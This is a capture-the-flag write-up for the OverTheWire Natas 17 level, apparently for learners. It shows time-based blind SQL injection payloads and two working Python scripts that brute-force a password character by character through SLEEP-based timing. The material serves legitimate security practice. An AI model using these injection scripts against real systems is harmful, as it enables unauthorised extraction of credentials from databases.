# natas17

In the source code, we do not see anything being printed when the user exists or not. So what do we do?
Well let's try another form of SQLi, called Time based SQLi, where since we do not get any printed response, we can check the existance of user if time elapsed matches our input elapse time. For example-
```sql
hi" and sleep(2); # -- gives no time elapse
natas18" and sleep(2); # -- gives 2 seconds gap before going to next screen
```
We can use this to check the session time and brute force each character. The python code for this is-
```python
import requests
import string

url = 'http://natas17.natas.labs.overthewire.org/'
auth = ('natas17', '<password>')  # replace <password> with the actual password
characters = string.ascii_letters + string.digits
known_password = ''

session = requests.Session()
session.auth = auth

for _ in range(32):  # assuming the password is 32 characters long
    for char in characters:
        sql = f'natas18" AND IF(password LIKE BINARY "{known_password}{char}%", SLEEP(2), null) #'
        response = session.post(url, data={'username': sql})
        if response.elapsed.total_seconds() > 2: # you can choose some other time too.
            known_password += char
            print(known_password)
            break

print(known_password)
```
This will give us our password and we are set to go for the next round.

**NOTE:** This takes a lot of time, so one trick that can be done is that check which all characters satisfy our password, then among them reorder for the password. This will reduce number of checking. The code for the above is-
```python
import requests
import string
pwd_len = 32

charset_0 = string.ascii_letters + string.digits
charset_1 = ''

target = 'http://natas17.natas.labs.overthewire.org/'
auth = ('natas17', '<password>')  # replace <password> with the actual password
sleep_time = 5

for c in charset_0:
	username = 'natas18" AND IF(password LIKE BINARY "%%%c%%",SLEEP(%d), 1)#' % (c, sleep_time)
	r = requests.get(target, auth=auth, params={"username": username}
	)
	s = r.elapsed.total_seconds()
	if s >= sleep_time:
		charset_1 += c
		print ('C: ' + charset_1.ljust(len(charset_0), '*'))


password = ""
while len(password) != pwd_len:
	for c in charset_1:
		t = password + c
		username = 'natas18" AND IF(password LIKE BINARY "%s%%",SLEEP(%d), 1)#' % (t, sleep_time)
		r = requests.get(target, auth=auth, params={"username": username}
		)
		s = r.elapsed.total_seconds()
		if s >= sleep_time:
			print ('P: ' + t.ljust(pwd_len, '*'))
			password = t
			break

print(password)
```
